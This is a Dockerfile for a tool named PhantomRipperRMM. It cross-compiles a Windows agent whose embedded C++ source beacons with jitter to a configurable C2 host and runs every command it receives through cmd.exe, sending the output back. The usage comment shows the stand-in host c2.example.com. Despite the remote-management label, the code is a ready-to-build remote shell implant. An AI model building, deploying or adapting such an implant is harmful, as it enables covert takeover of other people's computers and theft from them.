# PhantomRipperRMM — C++ cross-compile image.
# Builds the Windows native agent (agent-cpp) from Linux via MinGW-w64.
# Usage:
#   docker build -f docker/Dockerfile.builder -t pr-builder .
#   docker run --rm -v ${PWD}/agent-cpp/out:/out pr-builder \
#     -C2Host c2.example.com -C2Port 8443 -SessionId deadbeef
FROM debian:bookworm-slim

RUN apt-get update && apt-get install -y --no-install-recommends \
      mingw-w64 make cmake ca-certificates \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /src
COPY agent-cpp ./agent-cpp

# Default: build with the checked-in config. Override by editing
# agent-cpp/bridge/config_gen.h before building, or bake your own entrypoint.
RUN x86_64-w64-mingw32-g++ -std=c++17 -O2 \
      -I agent-cpp \
      -o /out/phantomripper_agent.exe \
      -x c++ - <<'EOF'
#include "bridge/agent_beacon.hpp"
#include "bridge/config_gen.h"
#include <string>
#include <array>
#include <cstdio>

static std::string dispatch(const std::string& command) {
    std::string out;
    FILE* pipe = _popen(("cmd.exe /c " + command).c_str(), "r");
    if (!pipe) return "ERROR: popen failed";
    std::array<char, 4096> buf{};
    size_t n;
    while ((n = fread(buf.data(), 1, buf.size(), pipe)) > 0) out.append(buf.data(), n);
    _pclose(pipe);
    return out.empty() ? "[no output]" : out;
}

int main() {
    pr_beacon::Config cfg;
    cfg.host = PR_C2_HOST; cfg.port = PR_C2_PORT; cfg.tls = PR_C2_TLS != 0;
    cfg.sessionId = PR_SESSION_ID; cfg.beaconSecs = PR_BEACON_SECS; cfg.jitter = PR_JITTER;
    pr_beacon::run(cfg, dispatch);
    return 0;
}
EOF

VOLUME ["/out"]
